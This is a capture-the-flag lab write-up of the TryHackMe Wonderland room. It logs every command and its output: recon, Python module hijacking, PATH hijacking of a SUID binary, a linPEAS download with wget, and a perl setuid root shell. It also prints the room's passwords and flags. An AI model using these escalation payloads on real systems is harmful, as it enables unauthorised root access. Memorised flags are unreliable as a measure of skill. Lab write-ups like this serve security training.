# TryHackMe – Wonderland (Full Raw Walkthrough)

Author: Vinay Trivedi
Platform: TryHackMe
Room: Wonderland

This write-up is a **raw walkthrough of my terminal session while solving the Wonderland room**.
It includes **every command I ran, outputs, failed attempts, and my thought process**.

---

# Initial Recon

I started by scanning the target machine.

```bash
nmap -sC -sV -A 10.113.191.223
```

Output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Golang net/http server

http-title: Follow the white rabbit.
```

## Thoughts

Two services available:

* SSH
* HTTP

The webpage title **"Follow the white rabbit"** clearly hinted that there might be hidden directories related to **rabbit**.

---

# Directory Enumeration

I used Gobuster to discover directories.

```bash
gobuster dir -u http://10.113.191.223/ -w /usr/share/wordlists/dirb/common.txt
```

Output:

```
/img
/index.html
/r
```

The `/r` directory looked interesting.

---

# Exploring /r

Navigating deeper eventually led to:

```
/r/a/b/b/i/t
```

This spells **rabbit**, matching the hint.

Inside the page source I discovered **SSH credentials**.

```
Username: alice
Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

---

# Initial Access

SSH login:

```bash
ssh alice@10.113.191.223
```

System message:

```
Welcome to Ubuntu 18.04.4 LTS
```

Listing files:

```bash
ls
```

Output:

```
root.txt
walrus_and_the_carpenter.py
```

Trying to read the root flag:

```bash
cat root.txt
```

Output:

```
Permission denied
```

So alice cannot read the root flag.

---

# Checking Sudo Permissions

```bash
sudo -l
```

Output:

```
User alice may run the following commands on wonderland:

(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

So alice can run the Python script **as rabbit**.

---

# Running the Script

```bash
sudo -u rabbit /usr/bin/python3.6 walrus_and_the_carpenter.py
```

Output:

```
The line was: The sun was shining on the sea,
The line was: Were walking close at hand;
```

The script simply prints random lines.

---

# Investigating Python Imports

Checking Python module paths:

```bash
python3.6 -c "import sys; print(sys.path)"
```

Output:

```
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', ...]
```

Important observation:

```
''
```

This means **Python searches the current directory first**.

Possible **module hijacking**.

---

# Privilege Escalation (Alice → Rabbit)

The script imports the `random` module.

So I created a malicious version.

```bash
nano random.py
```

Content:

```python
import os
os.system("/bin/bash")
```

Now running the script again:

```bash
sudo -u rabbit /usr/bin/python3.6 walrus_and_the_carpenter.py
```

Result:

```
rabbit@wonderland
```

I now had a **rabbit shell**.

---

# Enumerating as Rabbit

Listing files:

```bash
ls -la
```

Output:

```
teaParty
```

Permissions:

```
-rwsr-sr-x 1 root root teaParty
```

This means **SUID binary owned by root**.

---

# Running the Binary

```bash
./teaParty
```

Output:

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 04 Mar 2026 06:21:27 +0000
```

This timestamp strongly suggested the program uses the **date command internally**.

---

# Attempting Interaction

I tried typing commands:

```
id
```

Output:

```
Segmentation fault
```

The program crashed.

This made me suspect **PATH hijacking**.

---

# PATH Hijacking

Created a fake date command.

```bash
nano /tmp/date
```

Content:

```
#!/bin/bash
/bin/bash
```

Then:

```bash
chmod +x /tmp/date
export PATH=/tmp:$PATH
```

Running the binary again:

```bash
./teaParty
```

Result:

```
hatter@wonderland
```

Privilege escalation successful.

---

# Hatter Enumeration

Listing files:

```bash
ls
```

Output:

```
password.txt
```

Reading it:

```bash
cat password.txt
```

Output:

```
WhyIsARavenLikeAWritingDesk?
```

---

# Running linPEAS

To find more escalation vectors I transferred linPEAS.

Attacker machine:

```bash
python3 -m http.server 8000
```

Target machine:

```bash
wget http://192.168.158.108:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Important finding:

```
Files with capabilities:

/usr/bin/perl = cap_setuid+ep
```

---

# Privilege Escalation (Hatter → Root)

Using perl capability:

```bash
/usr/bin/perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'
```

Checking privileges:

```bash
id
```

Output:

```
uid=0(root) gid=1003(hatter)
```

Root shell obtained.

---

# Root Flag

Navigating to Alice directory:

```bash
cd /home/alice
ls
```

Output:

```
linpeas.sh
random.py
root.txt
walrus_and_the_carpenter.py
```

Reading root flag:

```bash
cat root.txt
```

Output:

```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---

# User Flag

Earlier during enumeration I also found:

```bash
cat /root/user.txt
```

Output:

```
thm{"Curiouser and curiouser!"}
```

---

# Final Credentials and Flags

## SSH Credentials

```
alice : HowDothTheLittleCrocodileImproveHisShiningTail
```

## Hatter Password

```
WhyIsARavenLikeAWritingDesk?
```

## User Flag

```
thm{"Curiouser and curiouser!"}
```

## Root Flag

```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---

# Final Attack Chain

```
Nmap scan
 → Web enumeration
 → Hidden directories

SSH access
 → alice

Privilege escalation
 → Python module hijacking
 → rabbit

Privilege escalation
 → SUID PATH hijacking
 → hatter

Privilege escalation
 → Linux capability abuse
 → root
```

---

# Lessons Learned

This room demonstrated multiple privilege escalation techniques:

* Python module hijacking
* PATH hijacking
* SUID exploitation
* Linux capability abuse
* Automated enumeration with linPEAS

---
